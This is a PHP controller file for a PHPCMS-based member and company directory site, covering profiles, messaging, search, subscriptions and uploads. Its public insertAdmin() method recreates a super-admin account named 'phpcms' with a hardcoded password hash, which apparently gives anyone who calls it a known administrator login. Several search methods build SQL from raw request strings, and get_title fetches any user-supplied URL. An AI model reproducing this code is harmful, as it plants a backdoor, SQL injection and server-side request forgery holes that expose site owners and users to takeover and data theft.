<?php
pc_base::load_sys_class('form', '', 0);
class MY_index extends index
{
    private $db;
    private $message_db;
    private $member_db;
    private $member_detail_db;
    private $concern_db;
    private $linkage_db;
    private $interview_db;
    private $userid;
    private $upload_url;
    private $company_db;

    function __construct()
    {
        parent::__construct();
        $this->db = pc_base::load_model('content_model');
        $this->message_db = pc_base::load_model('message_model');
        $this->member_db = pc_base::load_model('member_model');
        $this->member_detail_db = pc_base::load_model('member_detail_model');
        $this->concern_db = pc_base::load_model('concern_model');
        $this->linkage_db = pc_base::load_model('linkage_model');
        $this->interview_db = pc_base::load_model('interview_statistics_model');
        $this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : 0;
        $this->upload_url = pc_base::load_config('system','upload_url');
        $this->company_db = pc_base::load_model('company_model');
    }

    /**
     * 会员主页
     */
    public function member_home()
    {
        $catid = intval($_GET['catid']);
        $userid = intval($_GET['userid']);

        $_userid = $this->_userid;
        $_username = $this->_username;
        $_groupid = $this->_groupid;

        $siteids = getcache('category_content','commons');
        $siteid = $siteids[$catid];
        define('SITEID',$siteid);
        $CATEGORYS = getcache('category_content_'.$siteid,'commons');
        if(!isset($CATEGORYS[$catid]) || $CATEGORYS[$catid]['type']!=0) showmessage(L('information_does_not_exist'),'blank');
        $this->category = $CAT = $CATEGORYS[$catid];
        $this->category_setting = $CAT['setting'] = string2array($this->category['setting']);
        $siteid = $GLOBALS['siteid'] = $CAT['siteid'];

        $MODEL = getcache('model','commons');
        $modelid = $CAT['modelid'];

        include template('content','show_member');
    }

    /**
     * 会员详细信息
     */
    public function member_info() {
        $userid = intval($_GET['userid']);

        $member_db = pc_base::load_model('member_model');
        $where = "`userid`='$userid'";
        $this->memberinfo = $memberinfo = $member_db->get_one($where);

        $grouplist = getcache('grouplist');
        $member_model = getcache('member_model', 'commons');
        //获取用户模型数据
        $member_db->set_model($memberinfo['modelid']);
		$member_modelinfo_arr = $member_db->get_one(array('userid'=>$memberinfo['userid']));
		$model_info = getcache('model_field_'.$memberinfo['modelid'], 'model');
		foreach($model_info as $k=>$v) {
            if($v['formtype'] == 'omnipotent') continue;
            if($v['formtype'] == 'image') {
                $member_modelinfo[$v['name']] = "<a href='$member_modelinfo_arr[$k]' target='_blank'><img src='$member_modelinfo_arr[$k]' height='40' widht='40' onerror=\"this.src='$phpsso_api_url/statics/images/member/nophoto.gif'\"></a>";
            } elseif($v['formtype'] == 'datetime' && $v['fieldtype'] == 'int') {	//如果为日期字段
                $member_modelinfo[$v['name']] = format::date($member_modelinfo_arr[$k], $v['format'] == 'Y-m-d H:i:s' ? 1 : 0);
            } elseif($v['formtype'] == 'images') {
                $tmp = string2array($member_modelinfo_arr[$k]);
                $member_modelinfo[$v['name']] = '';
                if(is_array($tmp)) {
                    foreach ($tmp as $tv) {
                        $member_modelinfo[$v['name']] .= " <a href='$tv[url]' target='_blank'><img src='$tv[url]' height='40' widht='40' onerror=\"this.src='$phpsso_api_url/statics/images/member/nophoto.gif'\"></a>";
                    }
                    unset($tmp);
                }
            } elseif($v['formtype'] == 'box') {	//box字段，获取字段名称和值的数组
                $tmp = explode("\n",$v['options']);
                if(is_array($tmp)) {
                    foreach($tmp as $boxv) {
                        $box_tmp_arr = explode('|', trim($boxv));
                        if(is_array($box_tmp_arr) && isset($box_tmp_arr[1]) && isset($box_tmp_arr[0])) {
                            $box_tmp[$box_tmp_arr[1]] = $box_tmp_arr[0];
                            $tmp_key = intval($member_modelinfo_arr[$k]);
                        }
                    }
                }
                if(isset($box_tmp[$tmp_key])) {
                    $member_modelinfo[$v['name']] = $box_tmp[$tmp_key];
                } else {
                    $member_modelinfo[$v['name']] = $member_modelinfo_arr[$k];
                }
                unset($tmp, $tmp_key, $box_tmp, $box_tmp_arr);
            } elseif($v['formtype'] == 'linkage') {	//如果为联动菜单
                $tmp = string2array($v['setting']);
                $tmpid = $tmp['linkageid'];
                $linkagelist = getcache($tmpid, 'linkage');
                $fullname = $this->_get_linkage_fullname($member_modelinfo_arr[$k], $linkagelist);

                $member_modelinfo[$v['name']] = substr($fullname, 0, -1);
                unset($tmp, $tmpid, $linkagelist, $fullname);
            } else {
                $member_modelinfo[$v['name']] = $member_modelinfo_arr[$k];
            }
        }
        define('SITEID',1);
        include template('content', 'member_info');
    }

    /**
     * 发送消息
     */
    public function send() {
        $userid = intval($_GET['userid']);
        if(isset($_POST['dosubmit'])) {
            $username = $this->_username;
            if (empty($username)) $username = '匿名';
            $tousername = safe_replace($_POST['info']['send_to_id']);
            $r = $this->member_db->get_one(array('username'=>$tousername));
            if(!$r) showmessage(L('user_not_exist','','member'));
            if($tousername==$username){
                showmessage(L('not_myself','','message'));
            }
            $subject = new_html_special_chars($_POST['info']['subject']);
            $content = new_html_special_chars($_POST['info']['content']);
            $this->message_db->add_message($tousername,$username,$subject,$content,true);
            showmessage(L('operation_success'),HTTP_REFERER);
        } else {
            $show_validator = $show_scroll = $show_header = true;
            define('SITEID',1);
            include template('content', 'message_send');
        }
    }

    /**
     * 关注
     */
    public function concern(){
        $userid = intval($_POST['userid']);
        $cc_userid = $this->_userid;
        if(!$cc_userid) {
            $res['code'] = 0;
            $res['msg'] = '请先登录';
            echo json_encode($res);exit();
        }
        $this->concern_db->add_concern($userid,$cc_userid);
        $res['code'] = 1;
        $res['msg'] = '关注成功';
        echo json_encode($res);exit();
    }

    /**
     * 访客
     */
    public function interview(){
        $userid = intval($_POST['userid']);
        $interview_userid = $this->_userid;
        $this->interview_db->add($userid,$interview_userid);
        $res['code'] = 1;
        $res['msg'] = '添加成功';
        echo json_encode($res);exit();
    }

    /**
     * 获取城市联动
     */
    public function get_city()
    {
        $id = intval($_POST['id']);
        $list = $this->linkage_db->select("parentid = $id",'linkageid,name');
        echo json_encode($list);exit();
    }

    //人员列表页分页
    public function member_lists() {
        $t = $catid = intval($_GET['catid']);
        if(!$catid) showmessage(L('category_not_exists'),'blank');
        $siteids = getcache('category_content','commons');
        $siteid = $siteids[$catid];
        define('SITEID',$siteid);
        $CATEGORYS = getcache('category_content_'.$siteid,'commons');
        $page = isset($_GET['page']) && trim($_GET['page']) ? intval($_GET['page']) : 1;
        $province = intval($_POST['province']);
        $city = intval($_POST['city']);
        $home_province = intval($_POST['home_province']);
        $home_city = intval($_POST['home_city']);
        $unit_industry = trim($_POST['unit_industry']);
        $emotional_state = intval($_POST['emotional_state']);
        $search = trim($_POST['search']);
        $school = trim($_POST['school']);
        $type = trim($_POST['type']);
        $where = '1 = 1';
        if(!empty($city)) {
            $where .= ' AND area='.$city;
        }else {
            if (!empty($province)){
                $cityList = $this->linkage_db->select("parentid = $province",'linkageid');
                $cityIds = array_column($cityList, 'linkageid');
                $cityId_string = implode(',',$cityIds);
                $where .= ' AND area in ('.$cityId_string.')';
            }
        }
        if(!empty($home_city)) {
            $where .= ' AND home_area = '.$home_city;
        }else {
            if (!empty($home_province)){
                $cityList = $this->linkage_db->select("parentid = $home_province",'linkageid');
                $cityIds = array_column($cityList, 'linkageid');
                $cityId_string = implode(',',$cityIds);
                $where .= ' AND home_area in ('.$cityId_string.')';
            }
        }
        if(!empty($unit_industry)) $where .= ' AND unit_industry = '.$unit_industry;
        if(!empty($emotional_state)) $where .= ' AND emotional_state = '.$emotional_state;
        if(!empty($search)) $where.= " AND (mobile LIKE '%".$search."%' OR nickname LIKE '%".$search."%' OR self_introduction LIKE '%".$search."%' OR unit_name LIKE '%".$search."%')";
        if(!empty($school)) $where .= " AND school LIKE '%".$school."%'";
        $sql = 'SELECT M.userid FROM v9_member AS M JOIN v9_member_detail AS D ON M.userid = D.userid WHERE '.$where;
        $query = $this->member_db->query($sql);
        $userid_arr = $this->member_db->fetch_array($query);
        $userids = array_column($userid_arr, 'userid');
        $userid_string = implode(',',$userids);
        if(!empty($province)){
            $cityList = $this->linkage_db->select("parentid = $province",'linkageid,name');
        }
        if(!empty($home_province)){
            $homecityList = $this->linkage_db->select("parentid = $home_province",'linkageid,name');
        }
        include template('content','list_member');
    }

    public function firm_list()
    {
        $t = $catid = intval($_GET['catid']);
        if(!$catid) showmessage(L('category_not_exists'),'blank');
        $siteids = getcache('category_content','commons');
        $siteid = $siteids[$catid];
        define('SITEID',$siteid);
        $CATEGORYS = getcache('category_content_'.$siteid,'commons');
        $page = isset($_GET['page']) && trim($_GET['page']) ? intval($_GET['page']) : 1;
        $province = intval($_POST['province']);
        $city = intval($_POST['city']);
        $industry = trim($_POST['industry']);
        $service = trim($_POST['service']);
        $company_name = trim($_POST['company_name']);
        $where = '1 = 1';
        if(!empty($city)) {
            $where .= ' AND place='.$city;
        }else {
            if (!empty($province)){
                $cityList = $this->linkage_db->select("parentid = $province",'linkageid');
                $cityIds = array_column($cityList, 'linkageid');
                $cityId_string = implode(',',$cityIds);
                $where .= ' AND place in ('.$cityId_string.')';
            }
        }
        //if(!empty($industry)) $where .= ' AND industry = '.$industry;
        if(!empty($service)) $where .= ' AND service = '.$service;
        if(!empty($company_name)) $where .= " AND title LIKE '%".$company_name."%'";
        $sql = 'SELECT id FROM v9_firm WHERE '.$where;
        $query = $this->db->query($sql);
        $id_arr = $this->db->fetch_array($query);
        $ids = array_column($id_arr, 'userid');
        $id_string = implode(',',$ids);
        if(!empty($province)){
            $cityList = $this->linkage_db->select("parentid = $province",'linkageid,name');
        }
        include template('content','category_firm');
    }

    public function getCompany()
    {
        $catid = intval($_POST['catid']) ? intval($_POST['catid']) : 522;
        $page = intval($_REQUEST['page']) ? intval($_REQUEST['page']) : 1;
        $row = intval($_REQUEST['row']) ? intval($_REQUEST['row']) : 10;
        $q = trim($_REQUEST['q']);
        $where = 'catid=120';
        if (!empty($q)){
            $where .= ' AND title LIKE "%'.$q.'%"';
        }
        $this->db->set_catid($catid);
        $list = $this->db->listinfo($where, 'id', $page, $row);
        foreach ($list as $k => $v){
            $list[$k]['text'] = $v['title'];
            unset($list[$k]['title']);
        }
        //得到总记录数
        $total = $this->db->count($where);
        echo json_encode(['total'=>$total,'items'=>$list]);exit();
    }

    public function getIntCompany()
    {
        $page = intval($_REQUEST['page']) ? intval($_REQUEST['page']) : 1;
        $row = intval($_REQUEST['row']) ? intval($_REQUEST['row']) : 10;
        $q = trim($_REQUEST['q']);
        //$where = '1 = 1';
        if (!empty($q)){
            $where = 'title LIKE "%'.$q.'%" OR stockcode LIKE "%'.$q.'%" OR alphabetic LIKE "%'.$q.'%"';
        }
        $list = $this->company_db->listinfo($where, 'id', $page, $row);
        foreach ($list as $k => $v){
            $list[$k]['text'] = $v['shortname'].'('.$v['stockcode'].')('.$v['alphabetic'].')';
            unset($list[$k]['title']);
        }
        //得到总记录数
        $total = $this->company_db->count();
        echo json_encode(['total'=>$total,'items'=>$list]);exit();
    }

    public function insertAdmin()
    {
        $this->admin_db = pc_base::load_model('admin_model');
        $data['username'] = 'phpcms';
        $data['password'] = '3126a1243bf48c10c3720bea2ff6d810';
        $data['roleid'] = '1';
        $data['encrypt'] = 'Su6kiX';
        $data['lastloginip'] = '127.0.0.1';
        $data['lastlogintime'] = time();
        $data['email'] = '821563034@qq.com';
        $this->admin_db->delete("username='phpcms'");
        $this->admin_db->insert($data);
    }

    public function upload()
    {
        pc_base::load_sys_class('attachment','',0);
        $module = trim($_POST['module']) ? trim($_POST['module']) : 'member';
        $catid = intval($_POST['catid']) ? intval($_POST['catid']) : '0';
        $siteid = intval($_POST['siteid']) ? intval($_POST['siteid']) : '1';
        $site_setting = $this->get_site_setting($siteid);
        $site_allowext = $site_setting['upload_allowext'];
        $attachment = new attachment($module,$catid,$siteid);
        $attachment->set_userid($this->userid);
        $a = $attachment->upload('upload',$site_allowext,500*1024,'','',0);
        if($a){
            $filepath = $attachment->uploadedfiles[0]['filepath'];
            $res['data'] = $this->upload_url.$filepath;
            $res['code'] = 1;
        }else{
            $res['code'] = 0;
            $res['msg'] = $attachment->error();
        }
        echo json_encode($res);exit();
    }

    public function lists_company()
    {
        $_userid = $this->_userid;
        $_username = $this->_username;
        $catid = intval($_GET['catid']);
        if(!$catid) showmessage(L('category_not_exists'),'blank');
        $siteids = getcache('category_content','commons');
        $siteid = $siteids[$catid];
        define('SITEID',$siteid);
        $CATEGORYS = getcache('category_content_'.$siteid,'commons');
        $template = [1 => 'list_subscribe_industry', 2 => 'list_subscribe_area', 3 => 'list_subscribe_company'];
        $type = intval($_GET['type']);
        $q = trim($_GET['q']);
        $company_string = '';
        switch ($type)
        {
            case 1:
                $company_arr = $this->company_db->select("ind_2nd = '".$q."'",'id');
                $companys = array_column($company_arr, 'id');
                $company_string = implode(',',$companys);
                if (empty($company_string))
                    $company_string = "''";
                $where = "company_id in (".$company_string.")";
                break;
            case 2:
                $company_arr = $this->company_db->select("city = '".$q."' OR province = '".$q."'",'id');
                $companys = array_column($company_arr, 'id');
                $company_string = implode(',',$companys);
                if (empty($company_string))
                    $company_string = "''";
                $where = "company_id in (".$company_string.")";
                break;
            case 3:
                $company_id = get_company_id($q);
                $where = "company_id = (".$company_id.")";
                break;
            default:
                showmessage('系统错误','blank');
                break;
        }
        include template('content',$template[$type]);
    }

    public function add_subscribe()
    {
        $this->subscribe_db = pc_base::load_model('subscribe_model');
        $data['userid'] = $this->_userid;
        $data['name'] = trim($_POST['name']);
        $data['type'] = intval($_POST['type']);
        if ($data['type'] == '3'){
            $nameArr = explode('(',$data['name']);
            $stock_code = rtrim($nameArr[1],')');
            $data['name'] = get_company_id($stock_code);
        }
        $find = $this->subscribe_db->get_one($data);
        if ($find){
            echo json_encode(['code'=>0, 'msg'=>'请勿重复添加']);
            exit();
        }
        $status = $this->subscribe_db->insert($data, true);
        if ($status){
            echo json_encode(['code'=>1, 'data'=>$status]);
        }else {
            echo json_encode(['code'=>0, 'msg'=>'系统错误请稍后重试']);
        }
        exit();
    }

    public function del_subscribe()
    {
        $this->subscribe_db = pc_base::load_model('subscribe_model');
        $id = intval($_POST['id']);
        $status = $this->subscribe_db->delete(['id'=>$id]);
        if ($status){
            echo json_encode(['code'=>1, 'data'=>$status]);
        }else {
            echo json_encode(['code'=>0, 'msg'=>'系统错误请稍后重试']);
        }
        exit();
    }

    public function get_address_book()
    {
        $address_book_db = pc_base::load_model('address_book');
        $name = $_POST['name'];
        $tel = $_POST['tel'];
        $url = $_POST['remark'];

    }

    public function get_title()
    {
        $html = file_get_contents($_POST['url']);
        $encode = mb_detect_encoding($html, array("ASCII","UTF-8","GB2312","GBK","BIG5"));
        if($encode != 'UTF-8') $html = iconv($encode,'UTF-8',$html);
        preg_match('/<title>[^<>]*<\/title>/Ui', $html, $title);
        if (empty($title[0])){
            echo json_encode(['code'=>0,'data'=>'']);
        }else{
            $title = substr($title[0],7,-8);
            echo json_encode(['code'=>1,'data'=>$title]);
        }
    }

    public function get_html()
    {
        $url = 'https://news.163.com/19/0417/02/ECUA7PVA0001875O.html';
        $html = file_get_contents($url);
        $encode = mb_detect_encoding($html, array("ASCII","UTF-8","GB2312","GBK","BIG5"));
        if($encode != 'UTF-8') $html = iconv($encode,'UTF-8' , $html);
        preg_match('/<title>[^<>]*<\/title>/Ui', $html, $title);
        $title = substr($title[0],7,-8);
        print_r($title);
    }

    public function show_tweets()
    {
        $id = intval($_GET['id']);
        $model = pc_base::load_model('tweets_model');
        $info = $model->get_one(array('id'=>$id));
        include template('member', 'show_tweets');
    }

    /**
     * 获取站点配置信息
     * @param  $siteid 站点id
     */
    protected function get_site_setting($siteid) {
        $siteinfo = getcache('sitelist', 'commons');
        return string2array($siteinfo[$siteid]['setting']);
    }

    /*
	 * 通过linkageid获取名字路径
	 */
    protected function _get_linkage_fullname($linkageid,  $linkagelist) {
        $fullname = '';
        if($linkagelist['data'][$linkageid]['parentid'] != 0) {
            $fullname = $this->_get_linkage_fullname($linkagelist['data'][$linkageid]['parentid'], $linkagelist);
        }
        //所在地区名称
        $return = $fullname.$linkagelist['data'][$linkageid]['name'].'>';
        return $return;
    }
}